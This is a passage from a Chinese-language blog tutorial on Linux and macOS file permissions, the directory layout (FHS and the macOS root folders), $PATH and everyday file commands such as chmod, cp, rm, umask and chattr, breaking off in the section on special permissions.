title="文件权限"></a>文件权限</h3><p>操作文件时，若看见<code>Permission deny</code>字样，一般是文件权限配置问题。可以通过以下命令通过查看文件属性来查看权限</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -al   # 可以查看该目录下所有文件包括隐藏文件(.开头)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回显</span></span><br><span class="line">-rw-r--r--    1   sloth  staff     12288      Nov 26 09:41 .bash_profile.swm</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[文件权限] [连接数][所有者][用户组] [文件容量/B]  [创建/修改日期]      [文件名]</span></span><br></pre></td></tr></table></figure></div><p>表示为文件权限的字符串由10个字符组成</p><ul><li>第一个字符表示文件类型：d(目录) -(文件) l(连接文件) b(可供存储接口设备) c(串行端口设备)</li><li>2-4三个字符为”rwx”的组合表示<strong>文件所有者的权限</strong>：r(可读) w(可写不包括删除) x(可执行) (删除需要获取父目录的w权限)</li><li>5-7三个字符为”rwx”的组合表示<strong>同用户组的权限</strong></li><li>8-10三个字符为”rwx”的组合表示<strong>其他非本用户组的权限</strong></li></ul><blockquote><p>文件名以<code>.</code>开头的称为隐藏文件，mac下显示隐藏文件快捷键:<code>command+shift+.</code> </p><p>⚠️mac下创建隐藏文件会提示.开头文件以及被系统预留，不能创建</p><p>解决方法：终端输入</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool YES</span><br><span class="line">killall Finder   </span><br></pre></td></tr></table></figure></div><p>创建完输入</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool YES</span><br><span class="line">killall Finder </span><br></pre></td></tr></table></figure></div></blockquote><h3 id="文件权限及属性的修改"><a href="#文件权限及属性的修改" class="headerlink" title="文件权限及属性的修改"></a>文件权限及属性的修改</h3><ul><li><p>chgrp：改变文件所属用户组 </p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] dirname/filename        # -R:递归更改，改变子目录下所有文件、目录</span><br></pre></td></tr></table></figure></div></li><li><p>chown：改变文件所有者</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown [-R] 用户名称[:用户组名] dirname/filename    # 用户名与用户组间连接也可用&#x27;.&#x27;但在用户名中含&#x27;.&#x27;时会造成系统误判，因此不建议</span><br></pre></td></tr></table></figure></div></li><li><p>chmod：改变文件权限</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] [u/g/o/a][+/-/=][r/w/x]/权限分数 dirname/filename    # +与-更多是修改，而=相当于重置(会清空原来设置)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">权限分数的计算</span></span><br><span class="line">-rw-r-xr--    </span><br><span class="line">[4+2+0][4+0+1][4+0+0]=654   # rwx表示分数分别为4 2 1</span><br></pre></td></tr></table></figure></div><blockquote><p>对于设置<code>4 2 1</code>的理解：421利于计算机存储，4–100 2–010 1–001 如果设置成<code>3 2 1</code>由于系统只接受了和，而当系统接收到3时，无法判断是赋予读权限还是写+执行权限，会造成歧义</p><p>💡除输入以上命令外，mac下有一种略微简便的修改文件<strong>读写</strong>权限方式，在<code>文件简介</code>中可以修改user、group、all的<u>读写权限</u>(目前还未发现可以加入执行权限的文件类别),递归选项隐藏在左下角</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h27plpvekkj20m609ewf6.jpg"                      alt="image-20220514101004553" style="zoom:50%;"                 ><figcaption>image-20220514101004553</figcaption></figure><p>💡mac终端使用小技巧：直接将文件拖入终端会转换成绝对路径(不带引号)</p></blockquote></li></ul><h4 id="终端切换root用户权限"><a href="#终端切换root用户权限" class="headerlink" title="终端切换root用户权限"></a>终端切换root用户权限</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su -root</span><br><span class="line">su -</span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以上三种要求输入root用户密码</span></span><br><span class="line">sudo su  # 要求输入当前用户密码，切换到root用户</span><br></pre></td></tr></table></figure></div><blockquote><p>sudo是一种权限管理机制，依赖于&#x2F;etc&#x2F;sudoers ⚠️⚠️mac上不要轻易修改sudoers文件权限，这会导致终端无法切换root用户，sudo命令失效⚠️⚠️</p><p>补救措施：</p><ul><li>电脑仍能正常开机：<code>&gt;系统偏好设置&gt;用户与群组&gt;左下角开锁🔓&gt;登录选项&gt;网络账户服务器：加入&gt;打开目录实用工具&gt;菜单栏的&#39;编辑&#39;&gt;启用Root用户</code> 以root用户登录后便可在终端重新授权，该方式可以解决大多数<code>xxxx is owned by uid 501, should be 0</code>报错</li><li>电脑不能正常开机：长按电源键进入恢复模式，里面有个终端可以使用，或进入单用户模式进行修改权限操作</li></ul></blockquote><h2 id="0x02-目录结构"><a href="#0x02-目录结构" class="headerlink" title="0x02 目录结构"></a>0x02 目录结构</h2><h3 id="目录配置–FHS标准"><a href="#目录配置–FHS标准" class="headerlink" title="目录配置–FHS标准"></a>目录配置–FHS标准</h3><p>FHS依据文件系统使用的频繁与否以及是否允许用户随意改动，将目录定义为四种交互作用的形态</p><table><thead><tr><th align="left">类别</th><th>说明</th></tr></thead><tbody><tr><td align="left">可分享的(shareable)</td><td>可分享给其他系统挂载使用的目录，包括执行文件与用户的邮件数据等</td></tr><tr><td align="left">不可分享的(unshareable)</td><td>与机器相关的设备文件或与程序相关的socket文件等</td></tr><tr><td align="left">不变的(static)</td><td>内容不会经常变动，函数库、文件说明文件、系统管理员管理的配置文件等</td></tr><tr><td align="left">可变动的(variable)</td><td>登录文件、新闻组</td></tr></tbody></table><h4 id="Linux下根目录的主要子目录"><a href="#Linux下根目录的主要子目录" class="headerlink" title="Linux下根目录的主要子目录"></a>Linux下根目录的主要子目录</h4><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>存放在单用户模式下仍能执行的终端命令：ls、cat等等</td></tr><tr><td>&#x2F;boot</td><td>存放开机时使用到的文件，包括Linux内核文件、开机菜单、开机所需配置文件等</td></tr><tr><td>&#x2F;dev</td><td>在linux系统上任何设备与接口设备都以文件形式存在该目录下</td></tr><tr><td>&#x2F;etc</td><td>存放系统主要的配置文件，包括人员账号密码、各种服务的起始文件(如mysql的配置文件my.cnf)等   &#x2F;etc&#x2F;init.d存放所有服务的默认启动脚本</td></tr><tr><td>&#x2F;home</td><td>系统默认主文件夹，也是我们打开终端常见到的<code>~</code>   主文件夹的另一种代号：<code>~dmtsai</code>代表dmtsai的主文件夹</td></tr><tr><td>&#x2F;lib</td><td>存放开机时使用到的函数库，以及&#x2F;bin、&#x2F;sbin下命令调用的函数库</td></tr><tr><td>&#x2F;media</td><td>放置可删除的设备，光盘、软盘、DVD等</td></tr><tr><td>&#x2F;mnt</td><td>存放暂时挂载的某些额外设备</td></tr><tr><td>&#x2F;opt</td><td>存放第三方软件(如mac上的软件包神器homebrew)</td></tr><tr><td>&#x2F;root</td><td>root用户的主文件夹,单用户模式下该目录拥有root的主文件夹</td></tr><tr><td>&#x2F;sbin</td><td>开机、修复、还原系统所需命令，这些命令只有root才能够利用来“设置”系统，普通用户只能用于查询</td></tr><tr><td>&#x2F;srv</td><td>srv–service,存放网络服务所需数据目录www等，不过部分云服务器也会将www目录单独出来放在根目录下</td></tr><tr><td>&#x2F;tmp</td><td>用于一般用户或正在执行的程序暂时存放文件，任何人可访问，需定期清理，FHS甚至建议开机时将该目录清空</td></tr><tr><td>&#x2F;lost+found</td><td>使用标准的ext2&#x2F;ext3文件系统格式才会产生的目录，存放文件系统发生错误时的丢失片段</td></tr><tr><td>&#x2F;proc</td><td>虚拟文件系统，不含硬盘空间，放置的数据都是内存当中的，如系统内核、进程、外部设备的状态及网络状态</td></tr><tr><td>&#x2F;sys</td><td>与&#x2F;proc类似，记录内核相关信息</td></tr></tbody></table><blockquote><p>⚠️一定不能与根目录分开的目录：<code>/etc</code> <code>/bin</code> <code>/dev</code> <code>/lib</code> <code>/sbin</code></p></blockquote><h4 id="x2F-usr与-x2F-var"><a href="#x2F-usr与-x2F-var" class="headerlink" title="&#x2F;usr与&#x2F;var"></a>&#x2F;usr与&#x2F;var</h4><p>&#x2F;usr下主要目录 （注：usr–UNIX Software Resource 并不是user的缩写）</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;usr&#x2F;bin</td><td>绝大部分用户在终端可使用的命令，与&#x2F;bin的不同(是否与开机有关)</td></tr><tr><td>&#x2F;usr&#x2F;include</td><td>c&#x2F;c++等程序语言的头文件与包含文件，当我们以tarball方式(*.tar.gz)安装数据时，时常用到里面的头文件，装框架的时候不要忘记包含它的include目录(如mac下使用Qt+Clion，就要将Qt的include目录加入CMakeLists.txt)</td></tr><tr><td>&#x2F;usr&#x2F;X11R6</td><td>放置X Window系统重要数据</td></tr><tr><td>&#x2F;usr&#x2F;lib</td><td>各应用软件的函数库、目标文件、不被一般用户惯用的执行文件、脚本   X86_64的Linux系统还有&#x2F;usr&#x2F;lib64</td></tr><tr><td>&#x2F;usr&#x2F;local</td><td>系统管理员在本机自行安装下载的软件</td></tr><tr><td>&#x2F;usr&#x2F;sbin</td><td>非系统正常运行所需命令</td></tr><tr><td>&#x2F;usr&#x2F;share</td><td>共享文件，几乎都是文本文件</td></tr><tr><td>&#x2F;usr&#x2F;src</td><td>建议放置源码 src–source  内核源码建议放在&#x2F;usr&#x2F;src&#x2F;linux</td></tr></tbody></table><p>&#x2F;var下主要目录</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;cache</td><td>应用程序本身运行产生的暂存文件</td></tr><tr><td>&#x2F;var&#x2F;lib</td><td>程序执行所需数据文件存放的目录</td></tr><tr><td>&#x2F;var&#x2F;lock</td><td>一次只能被单一程序使用的文件资源或设备</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>登录文件</td></tr><tr><td>&#x2F;var&#x2F;mail</td><td>个人电子邮件信箱</td></tr><tr><td>&#x2F;var&#x2F;run</td><td>程序或服务启动后的PID</td></tr><tr><td>&#x2F;var&#x2F;spool</td><td>排队等待其他应用程序使用的数据，使用后通常被删除</td></tr></tbody></table><hr><h3 id="mac下根目录结构"><a href="#mac下根目录结构" class="headerlink" title="mac下根目录结构"></a>mac下根目录结构</h3><p>mac根目录一般指<code>macintosh HD</code>,一般情况下可见的只有4个文件夹Applications、Library、System、Users，显示隐藏文件夹后可以看见完整结构</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2807nwmzlj21f40o8wh4.jpg"                      alt="image-20220514161710097" style="zoom: 50%;"                 ><figcaption>image-20220514161710097</figcaption></figure><p>可以发现大部分文件都与Linux上一致，不同的有</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;Applications</td><td>默认所有的GUI应用程序都安装在这里，也是我们使用dmg安装程序时出现在访达框中的”Applications替身”的本体</td></tr><tr><td>&#x2F;cores</td><td>内核转储文(进程崩溃时产生)件存放目录</td></tr><tr><td>&#x2F;private</td><td>存放了&#x2F;tmp, &#x2F;var, &#x2F;etc等链接目录的目标目录</td></tr><tr><td>&#x2F;Volumes</td><td>文件系统挂载点存放目录</td></tr><tr><td>&#x2F;Library</td><td>中文下为”资源库”，存放系统的数据文件、帮助文件、文档等等</td></tr><tr><td>&#x2F;Users</td><td>存放用户的个人资料和配置。每个用户有自己的单独目录，除此外还有个shared目录</td></tr><tr><td>&#x2F;System</td><td>中存放了系统的绝大部分组件，如各种framework，以及内核模块，字体文件等等，我们会发现子目录中也有一个Applications，里面存放系统自带GUI应用程序</td></tr></tbody></table><blockquote><p>mac下的<code>~</code>是当前用户的顶级目录，指向<code>/User/当前用户名</code>目录</p></blockquote><h4 id="x2F-usr-x2F-local与-x2F-opt"><a href="#x2F-usr-x2F-local与-x2F-opt" class="headerlink" title="&#x2F;usr&#x2F;local与&#x2F;opt"></a>&#x2F;usr&#x2F;local与&#x2F;opt</h4><p><code>homebrew</code>是mac下强大的软件包工具(类似于apt-get)，可以轻松安装终端命令、服务(例如Mysql数据库)、甚至GUI应用程序等等。而通过命令行安装的homebrew默认放在&#x2F;opt下，通过homebrew安装的命令或服务都存放在其子目录Cellar下。而当你去官网中下载对应的pkg安装包安装各种服务时，这些服务默认放在&#x2F;usr&#x2F;local下</p><blockquote><p>因此观看博客时需要辨别其中本地已有服务的真实位置，可能大多数教程的mysql是使用homebrew安装，因此它的路径一般为<code>/opt/homebrew/Cellar/mysql</code>，但若你是官网安装的mysql，路径则为<code>/usr/local/mysql</code> </p><h4 id="💡homebrew的一个使用技巧："><a href="#💡homebrew的一个使用技巧：" class="headerlink" title="💡homebrew的一个使用技巧："></a>💡homebrew的一个使用技巧：</h4><p>在<code>/opt/homebrew/Library/Taps/homebrew/homebrew-core/Formula</code>目录下存储了许多.rb文件，对应着可通过homebrew安装的工具或服务，而为了更轻便，homebrew常将一个大型工具的不常用模块或驱动打包独立出来，以qt为例，执行<code>brew install qt</code>安装的仅是最基础版本，若需要连接mysql的服务要执行<code>brew install qt-mysql</code>，而这些往往不会写在官方文档中，因此我们要学习善用Formula目录，通过查找关键词，找到需要的服务，可以节省很多环境配置的时间</p></blockquote><h2 id="0x03-目录与路径"><a href="#0x03-目录与路径" class="headerlink" title="0x03 目录与路径"></a>0x03 目录与路径</h2><h3 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h3><p>相对路径：利用.、..等特殊目录描述相对于当前目录的文件路径 e.g. <code>../test.txt</code></p><p>绝对路径：从根目录&#x2F;开始写起  e.g. <code>/Users/sloth/install.sh</code></p><h3 id="目录相关操作"><a href="#目录相关操作" class="headerlink" title="目录相关操作"></a>目录相关操作</h3><h4 id="特殊目录"><a href="#特殊目录" class="headerlink" title="特殊目录"></a>特殊目录</h4><ul><li><code>.</code> –当前目录 </li><li><code>..</code> –上一级目录</li><li><code>-</code> –前一个目录(<code>cd -</code>同时还会回显上一个目录的路径(从~或根目录&#x2F;开始的绝对路径))</li><li><code>~</code> –当前用户主文件夹</li><li><code>~example</code> –example用户主文件夹</li></ul><h4 id="处理目录的命令"><a href="#处理目录的命令" class="headerlink" title="处理目录的命令"></a>处理目录的命令</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd 目录的绝对路径/相对路径 # 切换目录 change directory</span><br><span class="line">pwd [-P] # 显示当前目录 -P:显示实际目录(原身)，而不是连接文件(替身)</span><br><span class="line">mkdir [-m 权限][-p] # 新建目录 -m:配置权限  -p:创建多层目录</span><br><span class="line">rmdir [-p] # 删除一个空目录(删除非空目录会报错)  -p:一次性删除多层空目录 </span><br></pre></td></tr></table></figure></div><h3 id="环境变量-PATH"><a href="#环境变量-PATH" class="headerlink" title="环境变量$PATH"></a>环境变量$PATH</h3><p>$PATH的值一般是多个目录下的集合，当前用户可以执行这些目录存储的命令，Linux下这些目录以<code>:</code>分隔，而mac下以空格分隔</p><h4 id="执行非环境变量中的命令"><a href="#执行非环境变量中的命令" class="headerlink" title="执行非环境变量中的命令"></a>执行非环境变量中的命令</h4><p>可以采用命令的绝对路径来执行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig eth0</span><br></pre></td></tr></table></figure></div><p>采用命令添加</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=&quot;$PATH&quot;:命令路径    # 一般是一个bin文件目录</span><br></pre></td></tr></table></figure></div><p>配置文件添加，mac下也有许多环境变量相关配置文件,可以添加语句</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:命令路径</span><br></pre></td></tr></table></figure></div><blockquote><p>使用前记得执行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source 配置文件名路径</span><br></pre></td></tr></table></figure></div><p>注：如果有两个相同名字的命令存在PATH中，则执行PATH先查询到的目录下的命令</p></blockquote><h2 id="0x04-文件与目录管理"><a href="#0x04-文件与目录管理" class="headerlink" title="0x04 文件与目录管理"></a>0x04 文件与目录管理</h2><h3 id="常见文件-x2F-目录操作命令"><a href="#常见文件-x2F-目录操作命令" class="headerlink" title="常见文件&#x2F;目录操作命令"></a>常见文件&#x2F;目录操作命令</h3><h4 id="ls命令–查看文件与目录"><a href="#ls命令–查看文件与目录" class="headerlink" title="ls命令–查看文件与目录"></a>ls命令–查看文件与目录</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls [options] 目录名称</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用option</span></span><br><span class="line">-a  显示全部包括隐藏文件(还显示.与..)</span><br><span class="line">-d  仅列出目录本身(.)一般要搭配其他option一起使用</span><br><span class="line">-l  打印表示文件属性、权限的字符串</span><br><span class="line">-A  同-a ，但不列出 &quot;.&quot; 及 &quot;..&quot;</span><br><span class="line">-F  在列出的文件名称后加一符号标识 例如可执行档则加 &quot;*&quot;, 目录则加 &quot;/&quot;, sockert加&quot;=&quot;,FIFO文件加&quot;|&quot;</span><br><span class="line">-R  连同子目录下文件依序列出</span><br><span class="line">-r  将文件以相反次序显示(原定依英文字母次序)</span><br><span class="line">-t  将文件依建立时间之先后次序列出</span><br><span class="line">-n  列出UID与GID</span><br></pre></td></tr></table></figure></div><h4 id="cp命令–复制"><a href="#cp命令–复制" class="headerlink" title="cp命令–复制"></a>cp命令–复制</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp [options] source1 source2 …… destination</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数</span></span><br><span class="line">-d  若源文件为连接文件，则复制连接属性</span><br><span class="line">-p  连同文件的属性一起复制过去，而非使用默认属性(备份常用)</span><br><span class="line">-r  递归持续复制</span><br><span class="line">-a  相当于上面提到的三个options一起用(-pdr)</span><br><span class="line">-i  若目标文件已经存在时，在覆盖时会先询问动作的进行</span><br><span class="line">-u  用于更新，若destination比source旧才升级destination</span><br><span class="line">-f  为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次</span><br><span class="line">-l  建立硬连接</span><br><span class="line">-s  复制为符号连接文件 软连接</span><br></pre></td></tr></table></figure></div><blockquote><p>source有两个及以上时，目标文件必须是目录</p></blockquote><h4 id="rm命令–移除"><a href="#rm命令–移除" class="headerlink" title="rm命令–移除"></a>rm命令–移除</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm [options] 文件或目录</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用options</span></span><br><span class="line">-f  强制移除，忽略不存在文件，不出现警告</span><br><span class="line">-i  互动模式，删除前询问</span><br><span class="line">-r  递归删除</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>删除文件名以<code>-</code>开头文件，由于直接删除会被系统误判为option，因此只要加上<code>./</code></li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm ./-example</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">rm -- -example</span><br></pre></td></tr></table></figure></div><ul><li><p>没有options时，直接rm是无法删除目录的,一定要-r</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r 目录</span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h4 id="mv命令–移动或更名"><a href="#mv命令–移动或更名" class="headerlink" title="mv命令–移动或更名"></a>mv命令–移动或更名</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mv [options] source1 source2 …… destination</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数</span></span><br><span class="line">-f  不询问直接覆盖</span><br><span class="line">-i  覆盖前询问</span><br><span class="line">-u  更新，source比destination新才会更新</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重命名操作</span></span><br><span class="line">mv old_name new_name   # 处于同一目录下</span><br></pre></td></tr></table></figure></div><blockquote><p>mv移动默认删除原文件</p></blockquote><h4 id="利用以上命令实现文件移动新目录，不删除原文件"><a href="#利用以上命令实现文件移动新目录，不删除原文件" class="headerlink" title="利用以上命令实现文件移动新目录，不删除原文件"></a>利用以上命令实现文件移动新目录，不删除原文件</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp source1 source1_1</span><br><span class="line">cd 新路径</span><br><span class="line">mkdir 新目录</span><br><span class="line">mv source1_1完整路径 新目录</span><br></pre></td></tr></table></figure></div><h4 id="basename与dirname"><a href="#basename与dirname" class="headerlink" title="basename与dirname"></a>basename与dirname</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">basename 路径  # 返回文件名</span><br><span class="line">dirname 路径   # 返回目录名</span><br></pre></td></tr></table></figure></div><h3 id="文件内容查阅命令"><a href="#文件内容查阅命令" class="headerlink" title="文件内容查阅命令"></a>文件内容查阅命令</h3><ul><li>cat ：从第一行开始</li><li>tac ：从最后一话开始</li><li>nl：显示时列出行号</li><li>more：一页页显示</li><li>less：与more类似，但可以往前翻</li><li>head：只看头几行</li><li>tail：只看结尾几行</li><li>od：二进制方式读取</li></ul><h3 id="修改文件时间或创建文件–touch"><a href="#修改文件时间或创建文件–touch" class="headerlink" title="修改文件时间或创建文件–touch"></a>修改文件时间或创建文件–touch</h3><h4 id="三个变动时间"><a href="#三个变动时间" class="headerlink" title="三个变动时间"></a>三个变动时间</h4><ul><li>mtime :文件内容数据(不包括属性、权限)更改时更新</li><li>ctime :文件状态(属性权限等)改变时更新(cp时无法复制的属性)</li><li>atime :文件内容被取用时(如用cat读取)时更新</li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">touch [options] 文件</span><br><span class="line">-a  仅修改访问时间</span><br><span class="line">-c  仅修改文件时间，若文件不存在则新建</span><br><span class="line">-d  后接日期(不同于当前)，同 --date=&quot;日期或时间&quot;</span><br><span class="line">-m  仅修改mtime</span><br><span class="line">-t  后接时间(不同于当前)，格式为[YYMMDDhhmm]</span><br></pre></td></tr></table></figure></div><blockquote><p>可以通过<code>touch+文件名</code>在当前目录下新建一个文件，注意与mkdir区分(新建目录)</p><p>也可以通过<code>touch+文件名</code>将文件时间(mtime、atime)修改到现在</p></blockquote><h2 id="0x05-文件与目录的默认权限与隐藏权限"><a href="#0x05-文件与目录的默认权限与隐藏权限" class="headerlink" title="0x05 文件与目录的默认权限与隐藏权限"></a>0x05 文件与目录的默认权限与隐藏权限</h2><h3 id="文件默认权限：umask"><a href="#文件默认权限：umask" class="headerlink" title="文件默认权限：umask"></a>文件默认权限：umask</h3><p>Linux下输入会返回4个数字，与权限相关的是后三个，而mac下只返回后三个数字，而两者返回的代表权限的数字都等于<code>默认值-权限分数</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">umask   #在～下执行,加-S会以字母形式回显 u=rwx,g=rx,o=rx</span><br><span class="line">022     #回显 Linux下是0022</span><br><span class="line">cd /</span><br><span class="line">ls -al | grep sloth</span><br><span class="line">drwxr-xr-x   5 sloth  wheel   160 May  9 18:51 opt # 回显 可见权限分数是755</span><br></pre></td></tr></table></figure></div><h4 id="两种默认值"><a href="#两种默认值" class="headerlink" title="两种默认值"></a>两种默认值</h4><ul><li>新建文件时，默认值(rw-rw-rw-)为666，默认没有可执行权限,因此新建的文件权限分数为<code>666-022=644</code> <code>022</code>为umask，可设置</li><li>新建目录时，默认值(rwxrwxrwx)为777，因为x权限与进入此目录有关，因此新建的目录权限分数为<code>777-022=755</code></li></ul><h3 id="文件隐藏属性"><a href="#文件隐藏属性" class="headerlink" title="文件隐藏属性"></a>文件隐藏属性</h3><p>设置</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chattr [+-=][ASacdistu] 文件或目录</span><br><span class="line">A  设置后访问文件或目录后，atime不改变</span><br><span class="line">S  设置后所有改动同步写入磁盘</span><br><span class="line">a  设置后只能增加数据，root才能设置(常用)</span><br><span class="line">c  设置后自动压缩</span><br><span class="line">d  设置后改文件或目录不会被dump备份</span><br><span class="line">i  设置后该文件不能被删除、改名、无法写入添加数据，只有root可以设置(常用)</span><br><span class="line">s  设置后若被删除，会被完全从磁盘空间中删除</span><br><span class="line">u  与s相反，若被删除还会保留在磁盘中，可找回</span><br></pre></td></tr></table></figure></div><p>显示</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsattr [-adR] 文件或目录</span><br><span class="line">-a  隐藏文件的属性也显示</span><br><span class="line">-d  若操作目录，仅列出目录本身属性，不递归</span><br><span class="line">-R  递归</span><br></pre></td></tr></table></figure></div><h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>当s出现在user权限的x位置上，e.g. -rwsr-xr-x</p><ul><li>针对文件</li><li>仅对二进制程序有效</li><li>执行者对于该程序要有x权限</li><li>执行者在执行程序过程中<u>暂时</u>具有user的权限</li></ul><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>s出现在group权限的x位置上</p><ul><li>针对文件或目录</li><li>对二进制程序有用</li><li>执行者对于该程序要有x权限</li><li>执行者在执行程序过程中<u>暂时</u>具有group的权限</li></ul><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><ul><li>仅针对目录</li><li>用户在该目录下创建文件或目录时，只有自己与root才有权删除该文件，也无法改动他人文件</li></ul><h4 id="特殊权限的设置"><a href="#特殊权限的设置" class="headerlink" title="特殊权限的设置"></a>特殊权限的设置</h4><p>前面所提的权限分数都是三位数字，我们可以在设置权限分数时在开头加上代表特殊权限的第四位数字(特殊权限可叠加)</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td 